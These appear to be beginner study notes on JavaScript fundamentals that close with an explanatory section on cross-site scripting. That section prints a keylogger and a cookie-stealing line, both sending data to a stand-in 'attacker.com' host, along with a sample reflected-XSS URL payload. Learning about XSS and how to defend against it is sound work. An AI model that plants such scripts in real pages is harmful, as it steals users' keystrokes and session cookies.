## Variables & Operators:

#### **1. Comments in JavaScript**
- Use `//` to write comments in your code. Comments are notes for yourself and are ignored by the browser.
- Example:
  ```javascript
  // This is a comment. It won't run as code.
  ```

#### **2. Linking JavaScript to HTML**
- Use the `<script>` tag to link your JavaScript file to an HTML file.
- Place the `<script>` tag just before the closing `</body>` tag to ensure HTML loads first.
- Example:
  ```html
  <body>
    <script src="script.js"></script>
  </body>
  ```


#### **3. Variables in JavaScript**
Variables are like containers that store data. There are 3 types:

1. **`let`**: Use this if the value of the variable will change later.
   ```javascript
   let age = 25;
   age = 26; // This works!
   ```

2. **`const`**: Use this if the value will never change.
   ```javascript
   const pi = 3.14;
   // pi = 3.15; // This will cause an error!
   ```

3. **`var`**: Older way to declare variables. Avoid using it unless necessary.
   ```javascript
   var name = "Alice";
   ```


#### **4. Variable Scopes**
- **Global Scope**: Variables declared outside functions. They can be accessed anywhere.
  ```javascript
  let globalVar = "I'm global!";
  ```

- **Block Scope**: Variables declared inside `{}` (like in loops or if statements). They can only be accessed inside the block.
  ```javascript
  if (true) {
    let blockVar = "I'm inside a block!";
  }
  // console.log(blockVar); // Error! blockVar is not accessible here.
  ```


#### **5. Data Types in Variables**
Variables can store different types of data:
- **Number**: `let num = 10;`
- **String**: `let name = "Neo";`
- **Boolean**: `let isTrue = true;`
- **Array**: `let list = [1, 2, 3];`
- **Object**: `let person = { name: "John", age: 30 };`


#### **6. Arithmetic Operators**
Used for math operations:
- `+` (Addition): `10 + 5 = 15`
- `-` (Subtraction): `10 - 5 = 5`
- `*` (Multiplication): `10 * 5 = 50`
- `/` (Division): `10 / 5 = 2`
- `%` (Modulus): `10 % 3 = 1` (Remainder after division)
- `++` (Increment): `let x = 5; x++; // x = 6`
- `--` (Decrement): `let y = 5; y--; // y = 4`


#### **7. Comparison Operators**
Used to compare values:
- `==` (Equal to): `10 == 10` → `true`
- `===` (Equal value and type): `10 === "10"` → `false`
- `!=` (Not equal to): `10 != 5` → `true`
- `!==` (Not equal value or type): `10 !== "10"` → `true`
- `<` (Less than): `5 < 10` → `true`
- `>` (Greater than): `10 > 5` → `true`
- `<=` (Less than or equal to): `5 <= 5` → `true`
- `>=` (Greater than or equal to): `10 >= 5` → `true`


#### **8. Example Story**
Imagine you’re building a game:
- Use `let` for the player’s score because it changes as they play.
- Use `const` for the game’s rules because they never change.
- Use arithmetic operators to calculate points and comparison operators to check if the player wins.


#### **Key Takeaways**
- Use `let` for changing values, `const` for constant values.
- Use comments (`//`) to explain your code.
- Link JavaScript to HTML using `<script>`.
- Arithmetic and comparison operators are essential for calculations and logic.

---
---


### Conditionals:


#### **1. If Statements**
- Use `if` to run code only if a condition is true.
- Example:
  ```javascript
  if (5 === 5) {
    console.log('Hello World!'); // This runs because 5 equals 5
  }
  ```


#### **2. Else If Statements**
- Use `else if` to check multiple conditions.
- Example:
  ```javascript
  if (5 === 10) {
    console.log('This will not run');
  } else if (10 === 10) {
    console.log('This will run!'); // This runs because 10 equals 10
  }
  ```


#### **3. Else Statements**
- Use `else` as a fallback if no conditions are met.
- Example:
  ```javascript
  if (5 === 10) {
    console.log('This will not run');
  } else if (10 === 15) {
    console.log('This will not run either');
  } else {
    console.log('This will run!'); // This runs because no conditions were true
  }
  ```


#### **4. Switch Cases**
- Use `switch` to test multiple conditions in a cleaner way.
- Example:
  ```javascript
  const animal = 3;

  switch (animal) {
    case 1:
      console.log('Cow');
      break;
    case 2:
      console.log('Chicken');
      break;
    case 3:
      console.log('Monkey'); // This runs because animal is 3
      break;
    default:
      console.log('Animal?'); // Runs if no cases match
  }
  ```


#### **Key Takeaways**
- Use `if` for single conditions, `else if` for multiple conditions, and `else` as a fallback.
- Use `switch` for testing many conditions in a clean and readable way.
- Always use `break` in `switch` cases to stop the code from running into the next case.

---
---


### Functions:


#### **1. What is a Function?**
- A function is a block of code that performs a specific task.
- It can take inputs (called **parameters**) and return an output.
- Functions help you reuse code and keep your program organized.


#### **2. ES6 Function (Arrow Function)**
- Modern and concise way to write functions.
- Example:
  ```javascript
  const multiply = (a, b) => {
    let result = a * b;
    console.log(result); // Outputs 250
  };
  multiply(25, 10);
  ```


#### **3. ES5 Function (Traditional Function)**
- Older way to write functions, still widely used.
- Example:
  ```javascript
  function multiply(a, b) {
    let result = a * b;
    console.log(result); // Outputs 250
  }
  multiply(25, 10);
  ```


#### **4. Key Parts of a Function**
1. **Parameters**: Inputs passed to the function (e.g., `a` and `b`).
2. **Variables**: Used inside the function to store data (e.g., `let result = a * b`).
3. **Code Execution**: The logic inside the function (e.g., `console.log(result)`).
4. **Return Statement**: (Optional) Sends a value back to where the function was called.


#### **5. Why Use Functions?**
- **Reusability**: Write once, use many times.
- **Organization**: Break your code into smaller, manageable pieces.
- **Flexibility**: Functions can contain conditionals, loops, and other functions.


#### **6. Example Story**
Imagine you’re building a calculator:
- You create a `multiply` function to handle multiplication.
- Instead of writing the same code repeatedly, you just call `multiply(5, 10)` whenever you need it.


#### **Key Takeaways**
- Use **ES6 arrow functions** for modern, clean code.
- Use **parameters** to pass data into functions.
- Functions make your code **reusable** and **organized**.

---
---


### Objects & Arrays

### **Objects**
- Think of objects as collections of related data stored as *key-value pairs*.
- Example of an object:
  ```javascript
  var choosePill = {
      pillOne: 'Red',
      pillTwo: 'Blue'
  };
  ```
  **Explanation**:
  - `pillOne` and `pillTwo` are the *keys* (properties).
  - `'Red'` and `'Blue'` are the *values* stored in those keys.

You can also store numbers or other data types:
```javascript
var choosePill = {
    pillOne: 'Red',
    pillTwo: 'Blue',
    numberOfPills: 2
};
```
To access a value, use the key like this:
```javascript
var choice = choosePill.pillOne; // Accesses 'Red'
```


### **Arrays**
- Arrays are lists of values stored in a single variable.
- Example of an array:
  ```javascript
  var choosePill = ['Red', 'Blue', 2];
  var choice = choosePill[0]; // Accesses the 1st item ('Red')
  ```
  **Key Point**: 
  - Array positions (indexes) start from **0**, not 1.


### **When to Use?**
- **Objects**: Use when you want to label your data (keys like `pillOne` and `pillTwo`).
- **Arrays**: Use when you need a simple list of items.


### **Quick Example Challenge**
Given this code:
```javascript
var mrRobot = ['Elliot', 'Angela', 'Tyrell', 'Darlene'];
let character = mrRobot[2];
console.log(character);
```
The output will be:
**`Tyrell`** (because index 2 refers to the 3rd item in the array). 


**Summary**:
- Objects: Data is stored as `key: value`.
- Arrays: Data is stored as a list with numbered positions.
- Both are essential tools to manage data in JavaScript!

---
---


### Loops

**Loops** are used to repeat a block of code multiple times, making them essential in programming. There are three main types of loops: **for**, **while**, and **do...while**. 


### **For Loop**
A **for loop** repeats a block of code for a specified number of times.

**Structure**:
```javascript
for (initialization; condition; update) {
    // Code to execute
}
```

**Example**:
```javascript
for (a = 1; a <= 10; a++) {
    console.log(`Number: ${a}`); // Outputs 1 to 10
}
```

**Explanation**:
1. **Initialization** (`a = 1`): Sets the starting value of the loop.
2. **Condition** (`a <= 10`): Checks if the loop should keep running.
3. **Update** (`a++`): Increases `a` by 1 after each loop.

💡 **Tip**: Separate each part with a semicolon `;`.

### **While Loop**
A **while loop** keeps running as long as the condition is true.

**Example**:
```javascript
let x = 0;

while (x <= 3) {
    console.log(x++); // Outputs 0 to 3
}
```

**Explanation**:
- The loop runs while `x` is less than or equal to 3.
- `x++` increases the value of `x` after printing it.


### **Do...While Loop**
A **do...while loop** is similar to a while loop but guarantees the code runs **at least once**, even if the condition is false.

**Example**:
```javascript
let c = 10;

do {
    console.log(c++); // Outputs 10 to 50
} while (c <= 50);
```

**Explanation**:
- The loop executes the code first, then checks the condition (`c <= 50`).


### **Key Differences**
| Loop Type      | Condition Checked Before Execution? | Runs at Least Once? |
|----------------|-------------------------------------|---------------------|
| **For**        | Yes                                 | No                  |
| **While**      | Yes                                 | No                  |
| **Do...While** | No                                  | Yes                 |


### Summary
- Use **for loops** when you know the number of iterations.
- Use **while loops** for conditions where the number of iterations isn’t fixed.
- Use **do...while loops** if you need the code to run at least once.

---
---


### **Document Object Model (DOM)**

The **DOM (Document Object Model)** is how JavaScript interacts with and manipulates an HTML webpage. It allows you to grab, change, and control elements on a webpage.


### **Accessing Elements in the DOM**

1. **By ID**:
   ```javascript
   document.getElementById('ID_Name');
   ```
   - Example: Grabs an element with `id="header"` from your HTML.

2. **By Class Name**:
   ```javascript
   document.getElementsByClassName('Class_Name');
   ```
   - Example: Grabs all elements with the class `menu-item`.

3. **By Tag Name**:
   ```javascript
   document.getElementsByTagName('Tag_Name');
   ```
   - Example: Grabs all `<p>` tags in your HTML.


### **Manipulating the DOM**
To make your webpage interactive, you can:
- Add or remove elements.
- Change styles, text, or content.
- Respond to user actions using **events**.


### **Common Events**
Events let your code respond to user actions. Here are some frequently used ones:
1. **onclick**: Runs when a user clicks an element.
2. **onmouseover**: Runs when the mouse hovers over an element.
3. **onload**: Runs when an element or the page finishes loading.


### **Example**
**HTML**:
```html
<button id="myButton">Click Me</button>
```

**JavaScript**:
```javascript
document.getElementById('myButton').onclick = function() {
    alert('POP!!!'); // Displays an alert when the button is clicked
};
```

### **The Power of DOM**
The DOM makes your webpage dynamic. You can:
- Change styles with **CSS**.
- Add animations or user interactions.
- Use libraries like **React** for virtual DOM manipulation.
- Integrate with server-side technologies like **Node.js** or **PHP**.


---
---


### **XSS (Cross-Site Scripting)**

**XSS** is a web security vulnerability that allows attackers to inject and execute malicious scripts in the browser of a victim. This is commonly used to steal information, manipulate web applications, or perform phishing attacks.


### **What Can XSS Do?**
- **Keylogging**: Tracks the user’s keystrokes using malicious scripts.
- **Stealing Cookies**: Captures session cookies to impersonate users or gain access to accounts.
- **Phishing**: Modifies webpages or redirects users to fake websites to steal credentials.

💡 **Why is it dangerous?** Many websites store sensitive data in cookies or fail to sanitize user input properly, making XSS a high-risk vulnerability.


### **Types of XSS Attacks**

1. **DOM-Based XSS (Type-0)**:
   - Payload is executed in the victim’s browser by manipulating the DOM (Document Object Model).
   - It is a **client-side** attack.
   - Example: Malicious JavaScript embedded into client-side code.

2. **Reflected XSS (Non-Persistent)**:
   - Payload is included in the URL or user input and sent to the server, which "reflects" it back to the user.
   - Relies on the victim clicking a malicious link.
   - Example: `http://example.com/?q=<script>alert('Hacked!')</script>`

3. **Stored XSS (Persistent)**:
   - Payload is saved directly to the server’s database and delivered to users whenever they load the affected page.
   - Example: An attacker leaves a malicious script as a comment on a blog.


### **Why Learn JavaScript for XSS?**
JavaScript plays a key role in web applications and XSS attacks. Here’s how it helps:
- **Manipulating the DOM**: JavaScript lets you modify webpage elements to steal or change data.
- **Keylogger Script**: Tracks and saves user keystrokes.
- **Cloning Websites**: You can mirror a webpage and trick users into entering sensitive information.


### **Examples of Malicious JavaScript**
1. **Keylogger**:
   ```javascript
   document.addEventListener('keydown', (event) => {
       fetch('http://attacker.com/log', {
           method: 'POST',
           body: event.key
       });
   });
   ```

2. **Stealing Cookies**:
   ```javascript
   fetch('http://attacker.com/cookie?data=' + document.cookie);
   ```

3. **Phishing**:
   - Inject fake login forms into a webpage to capture credentials.


### **Protecting Against XSS**
1. **Sanitize Input**: Always validate and escape user input.
2. **Use Content Security Policies (CSP)**: Restrict scripts from unknown sources.
3. **Use HTTPS**: Encrypt data in transit.
4. **Learn More**: Visit resources like TryHackMe's XSS room and OWASP for detailed guides.


### **Further Resources**
- **STÖK's JavaScript for Hackers**: [YouTube Video](https://www.youtube.com/watch?v=FTeE3OrTNoA)
- **TryHackMe XSS Room**: [TryHackMe](https://tryhackme.com/room/xss)
- **OWASP XSS Guide**: [OWASP XSS](https://owasp.org/www-community/attacks/xss/)

